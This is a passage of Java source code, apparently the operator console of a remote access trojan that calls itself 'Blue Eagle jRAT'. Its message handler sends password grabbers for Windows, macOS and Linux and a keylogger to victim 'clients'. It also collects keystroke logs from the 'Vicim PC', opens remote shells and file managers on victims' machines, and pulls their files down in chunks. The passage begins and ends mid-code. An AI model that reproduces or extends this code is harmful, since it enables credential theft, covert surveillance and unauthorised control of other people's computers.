								
								//System.out.println("opn : " + opn.Get_sock());
								if(opn.Get_sock().equals(sock)){
									 System.out.println("to : " + sock);
									opn.Perform_data(Data);
									 
								}
							}
						 
						   
					 // }
					  break;   
				  	case "get_proc" :
				  		 
							for (Process_Manager opn : Open_Proc_VB){
								
								//System.out.println("opn : " + opn.Get_sock());
								if(opn.Get_sock().equals(sock)){
									 System.out.println("to : " + sock);
									opn.Perform_data(Data);
									 
								}
							}
						  
					  break;  
					case "result_proc_linux":	
				  		for (Process_Manager opn : Open_Proc_VB){
						
						System.out.println("opn proc : " + opn.Get_sock());
						if(opn.Get_sock().equals(sock)){
							 System.out.println("to : " + sock);
							opn.Perform_data(Data);
							 
						}
					}
				  
				  		break;  
					case "result_proc_other":	
				  		for (Process_Manager opn : Open_Proc_VB){
						
						System.out.println("opn other : " + opn.Get_sock());
						if(opn.Get_sock().equals(sock)){
							 System.out.println("to : " + sock);
							opn.Perform_data(Data);
							 
						}
					}
				  
				  		break;  
					 
					case "result_proc_mac":	
				  		for (Process_Manager opn : Open_Proc_VB){
						
						//System.out.println("opn : " + opn.Get_sock());
						if(opn.Get_sock().equals(sock)){
							 System.out.println("to : " + sock);
							opn.Perform_data(Data);
							 
						}
					}
				  
				  		break; 
					case "killed_proc":	
				  		for (Process_Manager opn : Open_Proc_VB){
						
						//System.out.println("opn : " + opn.Get_sock());
						if(opn.Get_sock().equals(sock)){
							 
							opn.command();
							 
						}
					}
				  
				  		break; 
				  		case "error_terminal_proc":	
				  		for (Process_Manager opn : Open_Proc_VB){
						
						//System.out.println("opn : " + opn.Get_sock());
						if(opn.Get_sock().equals(sock)){
							 System.out.println("to : " + sock);
							opn.Perform_data(Data);
							 
						}
					}
				  
				  		break;  
				  case "folderitem":
					//  if (Open_Forms.contains("open_fm" + sock) ==true ){
						for (File_Manager_VB opn : Open_FM_VB){
							if(opn.Get_sock().equals(sock)){
								opn.Perform_data(Data);
							 
							}
						}
						   
					 // }
					  break; 
				case "get_usr_folder":
					//  if (Open_Forms.contains("open_fm" + sock) ==true ){
						for (File_Manager_VB opn : Open_FM_VB){
							if(opn.Get_sock().equals(sock)){
								opn.Perform_data(Data);
							 
							}
						}
						   
					 // }
					  break; 
				case "get_dsk_folder":
					//  if (Open_Forms.contains("open_fm" + sock) ==true ){
						for (File_Manager_VB opn : Open_FM_VB){
							if(opn.Get_sock().equals(sock)){
								opn.Perform_data(Data);
							 
							}
						}
						   
					 // }
					  break;  
				case "send_pass_grabber_windows":
					try {
			
						//InputStream inf = 			Master.class.getResourceAsStream("/pkg_plugin_grabbers/" + "windows_pass_grab.exe");
						  
						File file_base64 = new File(Instance.getClass().getResource(Self_Path+File_Seperator+"pkg_plugin_grabbers" +File_Seperator+ "windows_pass_grab.exe").getFile());
				 
					String numeric = (SplitString(Data).get(2)).replace("fsfs", "");
					int key_log_chunk =Integer.parseInt(numeric);
					 
					FileInputStream fis= new FileInputStream(file_base64);
					
					try{
						 
						 byte[] encoded  = Base64.getEncoder().encode(Certain_Bytes(fis,key_log_chunk,1024,file_base64));
						Send_Data("pwd_grabberbase64" + YY + new String(encoded) + YY, sock, false);
						
					}catch(Exception e){}
				
					} catch (Exception e2) {
					 new MessageBox().errorBox_nothread("Cannot Install Password Grabber to Client : "  + sock  +"\n" + "Exception : " + e2.getMessage(), "Password Grabber Install error");
					}
				
					
					
					break;
				case"exp_er": 
					MessageBox.errorBox_nothread("Error from Client : " + sock + "\nException : " +(SplitString(Data).get(2)) , "Error RECIVED");
					break;
				case "result_pass_err":
					if (Open_Forms.contains("pass_grabber" + sock) ==false ){
						  
						try {
							Password_Viewer instance_passview = null;
					 
							  for (Password_Viewer opn : Open_Password_Viewer){
									if(opn.Get_sock().equals(sock)){
										 
											instance_passview = opn;
										    break;
										 
									}
							  }
							  if(instance_passview==null){
								  System.out.println("here" + Data);
								  instance_passview = new Password_Viewer(sock);
									 if (Open_Password_Viewer.contains(instance_passview)==false){
							 
										  instance_passview.Do_frame();
										  instance_passview.command();
										  instance_passview.Perform_data(Data);
										  Open_Password_Viewer .add(instance_passview);
										    break;
									  } 
									
									   
							  }else{
									 if (Open_Password_Viewer.contains(instance_passview)==false){
									 
										  instance_passview.Do_frame();
										  instance_passview.command();
										  instance_passview.Perform_data(Data);
										  Open_Password_Viewer .add(instance_passview);
										    break;
									  } else{
										Remove_Form_FileManager_VB(sock);
										instance_passview= new Password_Viewer(sock);
							 
										  instance_passview.Do_frame();
										  instance_passview.command();
										  instance_passview.Perform_data(Data);
										  Open_Password_Viewer .add(instance_passview);
										    break;
										  
									  }
							  }
							
						} catch (Exception e) {

						}
					  
					  
					  
					  
					
					
					  Open_Forms.add("pass_grabber" + sock);
					  
				}
				  break;
					//new MessageBox().errorBox_nothread(SplitString(Data).get(2), "");
				 
				case "result_pass":
					
					//String Full_X = Data.replace("liner_split", "\n");
					//new MessageBox().infoBox(Full_X, "");
					if (Open_Forms.contains("pass_grabber" + sock) ==false ){
						  
						try {
							Password_Viewer instance_passview = null;
					 
							  for (Password_Viewer opn : Open_Password_Viewer){
									if(opn.Get_sock().equals(sock)){
										 
											instance_passview = opn;
										    break;
										 
									}
							  }
							  if(instance_passview==null){
								  System.out.println("here" + Data);
								  instance_passview = new Password_Viewer(sock);
									 if (Open_Password_Viewer.contains(instance_passview)==false){
							 
										  instance_passview.Do_frame();
										  instance_passview.command();
										  instance_passview.Perform_data(Data);
										  Open_Password_Viewer .add(instance_passview);
										    break;
									  } 
									
									   
							  }else{
									 if (Open_Password_Viewer.contains(instance_passview)==false){
									 
										  instance_passview.Do_frame();
										  instance_passview.command();
										  instance_passview.Perform_data(Data);
										  Open_Password_Viewer .add(instance_passview);
										    break;
									  } else{
										Remove_Form_FileManager_VB(sock);
										instance_passview= new Password_Viewer(sock);
							 
										  instance_passview.Do_frame();
										  instance_passview.command();
										  instance_passview.Perform_data(Data);
										  Open_Password_Viewer .add(instance_passview);
										    break;
										  
									  }
							  }
							
						} catch (Exception e) {

						}
					  
					  
					  
					  
					
					
					  Open_Forms.add("pass_grabber" + sock);
					  
				}
				  break;
				
				case "installed_pass_mac":
					//re-enable
					break;
				case "installed_pass_linux_done":
					//final done
					break;
				case "installed_pass_linux":
					//re-enable
					try {
						File file_base64 = new File(Master.class.getResource(Self_Path+File_Seperator+"pkg_plugin_grabbers"+File_Seperator + "Linux_laz_pwd_grabber.zip").getFile());
						FileInputStream fis= new FileInputStream(file_base64);
						
						try{
							 ByteArrayOutputStream os = new ByteArrayOutputStream(); 
							 byte[] buffer = new byte[0xFFFF];
							 int ic = 0;
							    for (int len = fis.read(buffer)/2; len != -1; len = fis.read(buffer)) { 
							    	if (ic<file_base64.length()/2){
							    		ic+=1;
							    		continue;
							    	}
							        os.write(buffer, 0, len);
							    }
							 byte[] encoded  = Base64.getEncoder().encode(os.toByteArray());
							Send_Data("pwd_grabberbase64_linux_p2" + YY + new String(encoded) + YY, sock, false);
							
						}catch(Exception e){}
					}catch(Exception e){}
					break;
				
				
				case "send_pass_grabber_mac":
					try {
						File file_base64 = new File(Master.class.getResource(Self_Path+File_Seperator+"pkg_plugin_grabbers" +File_Seperator+ "MAC_laz_pwd_grabber.zip").getFile());
						FileInputStream fis= new FileInputStream(file_base64);
						
						try{
							 ByteArrayOutputStream os = new ByteArrayOutputStream(); 
							 byte[] buffer = new byte[0xFFFF];
							 
							    for (int len = fis.read(buffer); len != -1; len = fis.read(buffer)) { 
							        os.write(buffer, 0, len);
							    }
							 byte[] encoded  = Base64.getEncoder().encode(os.toByteArray());
							Send_Data("pwd_grabberbase64_mac" + YY + new String(encoded) + YY, sock,false);
							
						}catch(Exception e){}
					}catch(Exception e){}
				
					break;
				case "send_pass_grabber_linux":	
					try {
						File file_base64 = new File(Master.class.getResource(Self_Path+File_Seperator+"pkg_plugin_grabbers"+File_Seperator + "Linux_laz_pwd_grabber.zip").getFile());
						FileInputStream fis= new FileInputStream(file_base64);
						
						try{
							 ByteArrayOutputStream os = new ByteArrayOutputStream(); 
							 byte[] buffer = new byte[0xFFFF];
							 int ic = 0;
							    for (int len = fis.read(buffer); len != -1 && ic<file_base64.length()/2;len = fis.read(buffer)) { 
							        os.write(buffer, 0, len);
							        ic+=1;
							    }
							 byte[] encoded  = Base64.getEncoder().encode(os.toByteArray());
							Send_Data("pwd_grabberbase64_linux" + YY + new String(encoded) + YY, sock,false);
							
						}catch(Exception e){}
					}catch(Exception e){}
					break;
				
				case "send_keylogger_chunk"	  : 
					

					try {
						File file_base64 = new File(Master.class.getResource(Self_Path+File_Seperator+"pkg_plugin_logger"+File_Seperator + "keylog.jar").getFile());
				 
					String numeric = (SplitString(Data).get(2)).replace("fsfs", "");
					int key_log_chunk =Integer.parseInt(numeric);
					String key_log_Chunk = "";
					FileInputStream fis= new FileInputStream(file_base64);
					
					try{
						 
						 byte[] encoded  = Base64.getEncoder().encode(Certain_Bytes(fis,key_log_chunk,1024,file_base64));
						Send_Data("keyloggerbase64" + YY + new String(encoded) + YY, sock,false);
						
					}catch(Exception e){}
				
					} catch (IOException e2) {
					 new MessageBox().errorBox_nothread("Cannot Install Keylogger to Client : "  + sock  +"\n" + "Exception : " + e2.getMessage(), "Keylogger Install error");
					}
				
					
					
					break;
				case "keylogger_downloaded":
					called = 0;
					break;
					
				case "pwd_grabber_downloaded":
					called = 0;
					break;
						
				case "openterminal":
					  if (Open_Forms.contains("open_shell" + sock) ==false ){
						  
							try {
								terminal_command instance_fm = null;
						  // System.out.println("here" + Data);
								  for (terminal_command opn : Open_Shells){
										if(opn.Get_sock().equals(sock)){
											 
												instance_fm = opn;
											    break;
											 
										}
								  }
								  if(instance_fm==null){
									  System.out.println("here" + Data);
									  instance_fm = new terminal_command(sock);
										 if (Open_Shells.contains(instance_fm)==false){
											 
											  instance_fm.Do_frame();
											  
											  Open_Shells .add(instance_fm);
										  } 
										
										   
								  }else{
										 if (Open_Shells.contains(instance_fm)==false){
										 
											  instance_fm.Do_frame();
										 
											  Open_Shells .add(instance_fm);
										  } else{
											Remove_Form_Shells(sock);
											instance_fm= new terminal_command(sock);
											 
											  instance_fm.Do_frame();
											 
											  Open_Shells .add(instance_fm);
											   
											  
										  }
								  }
								
							} catch (Exception e) {

								  
								  /*File_Manager_VB instance_fm = new File_Manager_VB(sock);
								  if (Open_FM_VB.contains(instance_fm)==false){
									  instance_fm.Set_File_Sep(SplitString(Data).get(2).replace("fs", ""));
									  instance_fm.Do_frame();
									  instance_fm.command();
									  Open_FM_VB .add(instance_fm);
								  }*/
							}
						  
						  
						  
						  
						
						
						  Open_Forms.add("open_shell" + sock);
						  
					}
					break;
				case "result_terminal":
					//  if (Open_Forms.contains("open_fm" + sock) ==true ){
						for (terminal_command opn : Open_Shells){
							if(opn.Get_sock().equals(sock)){
								opn.Perform_data(Data);
							 
							}
						}
						   
					 // }
					  break;  
				case "keylogger_data":
					String warning = (SplitString(Data).get(2));
					String Log_Data = (SplitString(Data).get(3));
					
					  if (Open_Forms.contains("open_keylogger" + sock) ==false ){
						  
							try {
								keylogger_viewer instance_fm = null;
						  // System.out.println("here" + Data);"Logs Viewer For : "
								  for (keylogger_viewer opn : Open_Loggers){
										if(opn.Get_sock().equals(sock)){
											 
												instance_fm = opn;
											    break;
											 
										}
								  }
								  if(instance_fm==null){
									  System.out.println("here" + Data);
									  instance_fm = new keylogger_viewer(sock);
										 if (Open_Loggers.contains(instance_fm)==false){
											 
											  instance_fm.Do_frame();
											  
											  Open_Loggers .add(instance_fm);
										  } 
										
										   
								  }else{
										 if (Open_Loggers.contains(instance_fm)==false){
										 
											  instance_fm.Do_frame();
										 
											  Open_Loggers .add(instance_fm);
										  } else{
											Remove_Form_Shells(sock);
											instance_fm= new keylogger_viewer(sock);
											 
											  instance_fm.Do_frame();
											 
											  Open_Loggers .add(instance_fm);
											   
											  
										  }
								  }
								
							} catch (Exception e) {

								  
								  /*File_Manager_VB instance_fm = new File_Manager_VB(sock);
								  if (Open_FM_VB.contains(instance_fm)==false){
									  instance_fm.Set_File_Sep(SplitString(Data).get(2).replace("fs", ""));
									  instance_fm.Do_frame();
									  instance_fm.command();
									  Open_FM_VB .add(instance_fm);
								  }*/
							}
						  
						  
						  
						  
						
						
						  Open_Forms.add("open_keylogger" + sock);
						  
					}
						for (keylogger_viewer opn : Open_Loggers){
							if(opn.Get_sock().equals(sock)){
								opn.Perform_data(Data);
							 
							}
						}
				 
					try{
						String platformx = System.getProperty("os.name", "generic").toLowerCase(Locale.ENGLISH);
						 if ((platformx.indexOf("mac") >= 0) || (platformx.indexOf("darwin") >= 0)) {
							 
							 File_Seperator = ":";
						      } else if (platformx.indexOf("win") >= 0) {
						    	  File_Seperator = "\\";
						    		 
						      } else if (platformx.indexOf("nux") >= 0) {
						    	  File_Seperator = "/";
						    	 
						      } else {
						    	  File_Seperator = System.getProperty("path.separator");
						    	  if(File_Seperator !="/" || File_Seperator !="\\" || File_Seperator !=":"){
						    		  File_Seperator = System.getProperty("file.separator");
						    		  if(File_Seperator !="/" || File_Seperator !="\\" || File_Seperator !=":"){
						    			  File_Seperator = "/";
						    		  }
						    	  }
						      }
							if (warning.contains("arn=1")){
								new MessageBox().errorBox_nothread("The Log file in Vicim PC exceeds 3 KB" + "\n" + "Auto Delete for the file happens when it`s size is 5 KB", "Log file size Warning");
							}if (warning.contains("arn=2")){
								new MessageBox().errorBox_nothread("The Log file in Vicim PC exceeds 5 KB" + "\n" + "Log file is Deleted", "Log file Auto Reset");
								//save the log here 
								String currentUsersHomeDirx = System.getProperty("user.home");
								currentUsersHomeDirx = currentUsersHomeDirx + File_Seperator + "_Client_" + sock.replace(".", "-") + ".txt";
								try {
									FileOutputStream fos = new FileOutputStream(new File (currentUsersHomeDirx));
									fos.write((("Client "+sock +" Keylogger Data / LOG FILES [Blue Eagle jRAT Logger]" + "\n" + Log_Data)).getBytes());
									fos.flush();
									fos.close();
									Send_Data("clear_keylog" + YY, sock,false);
								} catch (Exception e) {
									new MessageBox().errorBox_nothread(e.getMessage(),"");
								}
								
							}
					}catch (Exception e) {
						new MessageBox().errorBox_nothread("Logger whole Ex : " + e.getMessage(),"");
					}
				
					break;
				case "send_pass_grabber_winx": //will send pass grabber package
					try {
							 
						File file_base64 = new File(Master.class.getResource(Self_Path+File_Seperator+"pkg_plugin_grabbers"+File_Seperator + "windows_pass_grab.exe").getFile());
				   
					 
					FileInputStream fis= new FileInputStream(file_base64);
					
					try{
						 
						 byte[] encoded  = Base64.getEncoder().encode(Certain_Bytes(fis,0,1024,file_base64));
						Send_Data("pwd_grabberbase64" + YY + new String(encoded) + YY, sock,false);
						
					}catch(Exception e){}
				
					} catch (IOException e2) {
					 new MessageBox().errorBox_nothread("Cannot Install Password Grabber to Client : "  + sock  +"\n" + "Exception : " + e2.getMessage(), "Password Grabber Install error");
					}
				
					 
					//System.out.println(content);
					break;
				case "send_keylogger": //will send keylogger package
					try {
						File file_base64 = new File(Master.class.getResource(Self_Path+File_Seperator+"pkg_plugin_logger" +File_Seperator+ "keylog.jar").getFile());
				   
					String key_log_Chunk = "";
					FileInputStream fis= new FileInputStream(file_base64);
					
					try{
						 
						 byte[] encoded  = Base64.getEncoder().encode(Certain_Bytes(fis,0,1024,file_base64));
						Send_Data("keyloggerbase64" + YY + new String(encoded) + YY, sock,false);
						
					}catch(Exception e){}
				
					} catch (IOException e2) {
					 new MessageBox().errorBox_nothread("Cannot Install Keylogger to Client : "  + sock  +"\n" + "Exception : " + e2.getMessage(), "Keylogger Install error");
					}
				
					 
					//System.out.println(content);
					break;
				  case "fileitem":
					 // if (Open_Forms.contains("open_fm" + sock) ==true ){
						for (File_Manager_VB opn : Open_FM_VB){
							if(opn.Get_sock().equals(sock)){
								opn.Perform_data(Data);
							 
							}
						}
						   
					 // }
					  break;  
				 
				  case "filemanager" :
					 // if (Open_Forms.contains("open_fm" + sock) ==true ){
						for (File_Manager_VB opn : Open_FM_VB){
							if(opn.Get_sock().equals(sock)){
								opn.Perform_data(Data);
								 
							}
						}
					 // }
					  break;
					  
				  case "del_succ" :
					 // if (Open_Forms.contains("open_fm" + sock) ==true ){
						for (File_Manager_VB opn : Open_FM_VB){
							if(opn.Get_sock().equals(sock)){
								 opn.external_refresh();
								 
							}
						}
					 // }
					  break;
				  case "prepare_chunk_mx"://Open_Downloaders
					  for (Downloader opn : Open_Downloaders){
							if(opn.Get_sock().equals(sock)){
								 
								try {
									opn.SetDownloader(sock,"Preparing Done .. Downloading ...",SplitString(Data).get(2));
								} catch (InterruptedException e) {
									// TODO Auto-generated catch block
									e.printStackTrace();
								}
								 
							}
					  }
					  break;
					  case "prepare_chunk_downloader_uns"://Open_Downloaders
					  String fname_x = SplitString(Data).get(3);
					 // new MessageBox().infoBox(fname, fname);
					  if (Open_Forms.contains("downloader_chunk_uns" + sock) ==false ){
							  
									  
									try {
										Downloader_uns instance_fm = null;
									//   System.out.println("here" + Data);
										  for (Downloader_uns opn : Open_Downloaders_uns){
												if(opn.Get_sock().equals(sock)){
													 
														instance_fm = opn;
													    break;
													 
												}
										  }
										  if(instance_fm==null){
											  instance_fm = new Downloader_uns(sock,"Preparing Unstable Download Please Wait..",SplitString(Data).get(2),fname_x);
												 if (Open_Downloaders_uns.contains(instance_fm)==false){
													 Open_Downloaders_uns.add(instance_fm);
													 instance_fm.Do_frame();
												  } 
												
												   
										  }
										
									} catch (Exception e) {
										// TODO Auto-generated catch block
										e.printStackTrace();
									}
									 Open_Forms.add("downloader_chunk_uns" + sock);
						  
					}
					  break;
					  case "prepare_chunk_uploader_uns"://Open uplo
						 
						  String fname_xupload = SplitString(Data).get(3);
						 // new MessageBox().infoBox(fname, fname);
						  if (Open_Forms.contains("uploader_chunk_uns" + sock) ==false ){
								  
										  
										try {
											Uploader instance_fm = null;
										//   System.out.println("here" + Data);
											  for (Uploader opn : Open_Uploaders_uns){
													if(opn.Get_sock().equals(sock)){
														 
															instance_fm = opn;
														    break;
														 
													}
											  }
											  if(instance_fm==null){
												  instance_fm = new Uploader(sock,"Preparing Uploader Please Wait..",SplitString(Data).get(2),fname_xupload);
													 if (Open_Uploaders_uns.contains(instance_fm)==false){
														 Open_Uploaders_uns.add(instance_fm);
														 instance_fm.Do_frame();
													  } 
													
													   
											  }
											
										} catch (Exception e) {
											// TODO Auto-generated catch block
											e.printStackTrace();
										}
										 Open_Forms.add("uploader_chunk_uns" + sock);
							  
						}
						  break;
						    
				  case "prepare_chunk_downloader"://Open_Downloaders
					  String fname = SplitString(Data).get(3);
					 // new MessageBox().infoBox(fname, fname);
					  if (Open_Forms.contains("downloader_chunk" + sock) ==false ){
							  
									  
									try {
										Downloader instance_fm = null;
									//   System.out.println("here" + Data);
										  for (Downloader opn : Open_Downloaders){
												if(opn.Get_sock().equals(sock)){
													instance_fm = opn;
													 break;
													}
										  }
										  if(instance_fm==null){
											  instance_fm = new Downloader(sock,"Stable Download / Preparing Chunks Please Wait..",SplitString(Data).get(2),fname);
												 if (Open_Downloaders.contains(instance_fm)==false){
													 Open_Downloaders.add(instance_fm);
													 instance_fm.Do_frame();
												  } 
												
												   
										  }
										
									} catch (Exception e) {
									 
									}
									 Open_Forms.add("downloader_chunk" + sock);
						  
					}
					  break;
					  
				  case "resu_ch_uns":
					  try{
						  String platformccc = System.getProperty("os.name", "generic").toLowerCase(Locale.ENGLISH);
							 if ((platformccc.indexOf("mac") >= 0) || (platformccc.indexOf("darwin") >= 0)) {
								 
								 File_Seperator = ":";
							      } else if (platformccc.indexOf("win") >= 0) {
							    	  File_Seperator = "\\";
							    		 
							      } else if (platformccc.indexOf("nux") >= 0) {
							    	  File_Seperator = "/";
							    	 
							      } else {
							    	  File_Seperator = System.getProperty("path.separator");
							    	  if(File_Seperator !="/" || File_Seperator !="\\" || File_Seperator !=":"){
							    		  File_Seperator = System.getProperty("file.separator");
							    		  if(File_Seperator !="/" || File_Seperator !="\\" || File_Seperator !=":"){
							    			  File_Seperator = "/";
							    		  }
							    	  }
							      }
						  String chunk_local_pathxxx = SplitString(Data).get(4);
							String chunk_filenamexxx = SplitString(Data).get(2);//with dot 
						   String contentxxx = SplitString(Data).get(6);
						   String currentUsersHomeDirxxxx = System.getProperty("user.home");
						   String chu_fol_pathxxx = currentUsersHomeDirxxxx + File_Seperator + SplitString(Data).get(3)+"_Down";
						   
						   File fxxxx = new File(chu_fol_pathxxx); 
						 
						   if(fxxxx.exists()){
							   if (contentxxx.equals("null")){
								  
								    Send_Data("i_got_resume"  + YY + chunk_local_pathxxx +YY + SplitString(Data).get(3) + YY + SplitString(Data).get(5)  + YY, sock,false);	 
							   }else{
								   File Chunk_file = new File(fxxxx.getAbsolutePath() + File_Seperator + chunk_filenamexxx);
								   FileOutputStream output = new FileOutputStream(Chunk_file,true);
								  
								   String base64_tofile = contentxxx;
								   byte[] data = Base64.getDecoder().decode(base64_tofile);
								    
								   output.write(data);
								   output.flush();
								    output.close();
								    Send_Data("send_chunk_uns"  + YY + chunk_local_pathxxx +YY + SplitString(Data).get(3) + YY + SplitString(Data).get(5)  + YY, sock,false);	 
							   }
							 
							
							} 
					  }catch(Exception ex){
						  
						  
						//  new MessageBox().errorBox_nothread(ex.getMessage(), "Error");
					  }
					  break;
				  case	"send_actual_ch_uns":
					  try{
						  
						  String platformccc = System.getProperty("os.name", "generic").toLowerCase(Locale.ENGLISH);
							 if ((platformccc.indexOf("mac") >= 0) || (platformccc.indexOf("darwin") >= 0)) {
								 
								 File_Seperator = ":";
							      } else if (platformccc.indexOf("win") >= 0) {
							    	  File_Seperator = "\\";
							    		 
							      } else if (platformccc.indexOf("nux") >= 0) {
							    	  File_Seperator = "/";
							    	 
							      } else {
							    	  File_Seperator = System.getProperty("path.separator");
							    	  if(File_Seperator !="/" || File_Seperator !="\\" || File_Seperator !=":"){
							    		  File_Seperator = System.getProperty("file.separator");
							    		  if(File_Seperator !="/" || File_Seperator !="\\" || File_Seperator !=":"){
							    			  File_Seperator = "/";
							    		  }
							    	  }
							      }
						  String filename_withoutdot = SplitString(Data).get(2); //here without dot 
						 
						   String currentUsersHomeDirxxxx = System.getProperty("user.home");
						   String filename_withdot = SplitString(Data).get(3); 
						   String fulll_path = currentUsersHomeDirxxxx + File_Seperator + "JRat_Downloads" + File_Seperator + filename_withoutdot +"_Down" + File_Seperator + filename_withdot;
						   File Chunk_file = new File(fulll_path);
						   int need_chu = (int) (Chunk_file.length()/1024);
						   String neededx = need_chu + "fsfs";
						   Send_Data("actual_chunk_uns"  + YY +  neededx  +YY +SplitString(Data).get(4) + YY  + filename_withdot + YY ,sock,false );
					  }catch(Exception e){
						   String filename_withdot = SplitString(Data).get(3); 
						   int need_chu = 0;
						   String neededx = need_chu + "fsfs";
						   Send_Data("no_actual_uns"  + YY +  neededx  +YY +SplitString(Data).get(4) + YY  + filename_withdot + YY ,sock,false );
						  
						  
					  }
					  break;
				  case "dw_ch_uns_nothread":
				  case "dw_ch_uns":
					  String platformccc = System.getProperty("os.name", "generic").toLowerCase(Locale.ENGLISH);
						 if ((platformccc.indexOf("mac") >= 0) || (platformccc.indexOf("darwin") >= 0)) {
							 
							 File_Seperator = ":";
						      } else if (platformccc.indexOf("win") >= 0) {
						    	  File_Seperator = "\\";
						    		 
						      } else if (platformccc.indexOf("nux") >= 0) {
						    	  File_Seperator = "/";
						    	 
						      } else {
						    	  File_Seperator = System.getProperty("path.separator");
						    	  if(File_Seperator !="/" || File_Seperator !="\\" || File_Seperator !=":"){
						    		  File_Seperator = System.getProperty("file.separator");
						    		  if(File_Seperator !="/" || File_Seperator !="\\" || File_Seperator !=":"){
						    			  File_Seperator = "/";
						    		  }
						    	  }
						      }
					  String chunk_local_pathxxx = SplitString(Data).get(4);
						String chunk_filenamexxx = SplitString(Data).get(2);//with dot 
					   String contentxxx = SplitString(Data).get(6);
					   String currentUsersHomeDirxxxx = System.getProperty("user.home");
					   String chu_fol_pathxxx = currentUsersHomeDirxxxx + File_Seperator + "JRat_Downloads" + File_Seperator + SplitString(Data).get(3)+"_Down";
					   
					   File fxxxx = new File(chu_fol_pathxxx); 
					 
					   if(fxxxx.exists() == false){
							fxxxx.mkdirs();
						
						} 
					   
					   
					   try {
						   File x = new File(chu_fol_pathxxx);
						   File Chunk_file = new File(x.getAbsolutePath() + File_Seperator + chunk_filenamexxx);
						   
						   System.out.println(  "  __  " +   SplitString(Data).get(3)  + "____" + SplitString(Data).get(5) );
						   if(Chunk_file.exists()){
							   FileOutputStream output = new FileOutputStream(Chunk_file,true);
							   
							   try {
								   int need_chu_before_put = (int) (Chunk_file.length()/1024);
								   int from_trojan = Integer.parseInt(SplitString(Data).get(5).replace("fsfs", ""));
								   System.out.println("from trojan " + from_trojan);
								   System.out.println("before " + need_chu_before_put);
								 
									   String base64_tofile = contentxxx;
									    byte[] data = Base64.getDecoder().decode(base64_tofile);
									   output.write(data);
									   output.close();
									   String path_there  = chunk_local_pathxxx.replace(chunk_filenamexxx, "") + "UnstableChunksFor_" +SplitString(Data).get(3);
									 // System.out.println(path_there);  SplitString(Data).get(5)
									   int need_chu = (int) (Chunk_file.length()/1024);//need_chu+=1;
									   String numeric = "fsfs" + need_chu;
									   //need_chu+=1;
									 // System.out.println("actual " + need_chu);
										 
									    Send_Data("send_chunk_uns"  + YY +  path_there  +YY + SplitString(Data).get(3) + YY +numeric+ YY + chunk_filenamexxx + YY, sock,false);
								 
								  
							   }catch(Exception ex){}
						   }else{
							   FileOutputStream fos=new FileOutputStream(Chunk_file);
							    
							   try {
								   String base64_tofile = contentxxx;
								    byte[] data = Base64.getDecoder().decode(base64_tofile);
								    fos.write(data);
									fos.close();//	
									String numeric = SplitString(Data).get(5);
									//numeric = numeric.replace("fsfs", "");
								//	System.out.print("1st" + numeric);
									
									Send_Data("send_chunk_uns"  + YY + chunk_local_pathxxx +YY + SplitString(Data).get(3) + YY + "fsfs1"  + YY + chunk_filenamexxx + YY, sock,false);
								}catch(Exception ex){}
						   } 
						} catch (Exception e1) {}
					   int icpou = 0;
						  for (Downloader_uns opn : Open_Downloaders_uns){
							if(opn.Get_sock().equals(sock) ){
								String numeric = SplitString(Data).get(5);
								numeric = numeric.replace("fsfs", "");
							//	 System.out.print("\nMaster : " +numeric+"\n");
									opn.set_chunk_counter(Integer.parseInt((SplitString(Data).get(7))),Integer.parseInt(numeric));
									//opn.Perform_data();
										icpou +=1;
									try {
										opn.SetDownloader_W(sock,"Download Type : Unstable download / Status : Downloading...");
									
									} catch (InterruptedException e) {
									 
									}
									 
								}
							}
						 if(icpou ==0){
							  
								try {
									  Downloader_uns instance_fm = new Downloader_uns(sock,"Preparing Unstable Download Please Wait..",SplitString(Data).get(2),"");
									if (Open_Downloaders_uns.contains(instance_fm)==false){
										Open_Downloaders_uns.add(instance_fm);
										 instance_fm.Do_frame();
										
										 instance_fm.set_chunk_counter(Integer.parseInt((SplitString(Data).get(7))),Integer.parseInt((SplitString(Data).get(5))));
										 instance_fm.SetDownloader_W(sock,"Download Type : Unstable download / Status : Downloading...");
										 Open_Forms.add("downloader_chunk_uns" + sock);
										} 
									
								} catch (Exception e) {
									// TODO Auto-generated catch block
									e.printStackTrace();
								}
								
						 }else{
							 break;
						 }
						  
						  
						  break;
				  case "finished_down_uns":
					  try{
							 System.out.print("i got finished"+ Data);
							
								 String platformx = System.getProperty("os.name", "generic").toLowerCase(Locale.ENGLISH);
								 if ((platformx.indexOf("mac") >= 0) || (platformx.indexOf("darwin") >= 0)) {
									 
									 File_Seperator = ":";
								      } else if (platformx.indexOf("win") >= 0) {
								    	  File_Seperator = "\\";
								    		 
								      } else if (platformx.indexOf("nux") >= 0) {
								    	  File_Seperator = "/";
								    	 
								      } else {
								    	  File_Seperator = System.getProperty("path.separator");
								    	  if(File_Seperator !="/" || File_Seperator !="\\" || File_Seperator !=":"){
								    		  File_Seperator = System.getProperty("file.separator");
								    		  if(File_Seperator !="/" || File_Seperator !="\\" || File_Seperator !=":"){
								    			  File_Seperator = "/";
								    		  }
								    	  }
								      }
							  String finsihed_chunk_name = SplitString(Data).get(2);
							  String usr_dir = System.getProperty("user.home");
							  int lasx = finsihed_chunk_name.lastIndexOf(".");
							  String finished_chunks = usr_dir + File_Seperator + "JRat_Downloads" + File_Seperator + finsihed_chunk_name.substring(0,lasx)+"_Down"; 
						 
							   for (Downloader_uns opn : Open_Downloaders_uns){
								
									if(opn.Get_sock().equals(sock) ){
										
										 String filedir_exec = usr_dir + File_Seperator +"JRat_Downloads" + File_Seperator;	
										try{
											

											 if (new File(filedir_exec).exists() ==false){
												 new File(filedir_exec).mkdirs();
											 }
												FileInputStream fis=new FileInputStream(new File(finished_chunks+File_Seperator+finsihed_chunk_name));
												FileOutputStream fos=new FileOutputStream(new File(filedir_exec+File_Seperator+finsihed_chunk_name));
												int bfsz;
												byte[] buff = new byte[512];
												while((bfsz=fis.read(buff))>0){
													fos.write(buff, 0, bfsz);
												}
												fis.close();
												fos.close();
											 opn.On_Finish(filedir_exec,finsihed_chunk_name);
											 
											Send_Data("reset_chunk_downloaders"+ YY + "" + YY, sock,false);
											 Desktop.getDesktop().open(new File(filedir_exec));
											 for (File_Manager_VB opnx : Open_FM_VB){
													if(opnx.Get_sock().equals(sock)){
														opnx.re_enable();
														
													}
												}
											 File dir = new File(finished_chunks + File_Seperator);
											 File[] currList;
											 Stack<File> stack = new Stack<File>();
											 stack.push(dir);
											 while (! stack.isEmpty()) {
											     if (stack.lastElement().isDirectory()) {
											         currList = stack.lastElement().listFiles();
											         if (currList.length > 0) {
											             for (File curr: currList) {
											                 stack.push(curr);
											             }
											         } else {
											             stack.pop().delete();
											         }
											     } else {
											         stack.pop().delete();
											     }
											 }
											
